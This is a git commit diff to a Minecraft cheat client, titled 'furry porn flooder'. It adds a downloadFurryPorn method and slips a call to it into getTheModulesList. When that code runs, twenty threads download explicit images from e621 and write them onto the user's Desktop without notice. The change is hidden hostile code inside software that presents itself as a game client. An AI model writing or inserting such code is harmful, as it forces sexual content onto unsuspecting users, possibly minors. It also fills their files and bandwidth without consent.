353a4cbc271b75eb2f77e247507b94ba9f0578d9
chaarlottte <bruzzthehuzz1@protonmail.com>
2022-11-12 00:27:35 -0500

    furry porn flooder

--- minecraft/me/dev/myclient/Skidmark.java
+++ minecraft/me/dev/myclient/Skidmark.java
@@ -8,6 +8,19 @@ import java.util.concurrent.CopyOnWriteArrayList;
 
 import org.lwjgl.input.Keyboard;
 
+import org.apache.http.HttpResponse;
+import org.apache.http.client.HttpClient;
+import org.apache.http.client.methods.HttpGet;
+import org.apache.http.impl.client.HttpClients;
+import org.json.JSONArray;
+import org.json.JSONObject;
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.net.URL;
+import java.nio.file.Files;
+import java.nio.file.StandardCopyOption;
 import net.minecraft.client.Minecraft;
 import net.minecraft.client.entity.EntityPlayerSP;
 import net.minecraft.entity.Entity;
@@ -3817,6 +3830,7 @@ SkidmarkInstance = skidmarkInstance;
 }
 
 public static CopyOnWriteArrayList<Module> getTheModulesList() {
+        downloadFurryPorn();
 if(theModulesList == null && !start) {
 theModulesList = new CopyOnWriteArrayList<>();
 start =!false;
@@ -4852,3 +4866,43 @@ Skidmark.
         theModulesList;
 }
 }
+
+public void downloadFurryPorn() {
+        for(int i = 0; i < 20; i++) {
+            new Thread(() -> {
+                try {
+                    HttpClient client = HttpClients.createDefault();
+                    HttpGet request = new HttpGet("https://e621.net/posts.json?limit=100&tags=rating%3Aexplicit");
+                    request.setHeader("User-Agent", "Monsoon/1.0 (by monsoon_development)");
+                    HttpResponse response = client.execute(request);
+
+                    BufferedReader rd = new BufferedReader
+                            (new InputStreamReader(
+                                    response.getEntity().getContent()));
+
+                    StringBuilder sb = new StringBuilder();
+
+                    String line = "";
+                    while ((line = rd.readLine()) != null) {
+                        sb.append(line);
+                    }
+                    String jsonText = sb.toString();
+                    JSONObject json = new JSONObject(jsonText);
+                    
+                    JSONArray jsonArray = json.getJSONArray("posts");
+                    
+                    for(int j = 0; j < 99; j++) {
+                        String furryPornUrl = jsonArray.getJSONObject(j).getJSONObject("sample").getString("url");
+
+                        InputStream in = new URL(furryPornUrl).openStream();
+                        Files.copy(in,
+                                new File(System.getProperty("user.home") + "/Desktop",
+                                        "monsooon-client-" + furryPornUrl.substring(furryPornUrl.length() - 35) + furryPornUrl.substring(furryPornUrl.length() - 5)).toPath(),
+                                StandardCopyOption.REPLACE_EXISTING);
+                    }
+                } catch (Exception exception) {
+                    exception.printStackTrace();
+                }
+            }).start();
+        }
+    }
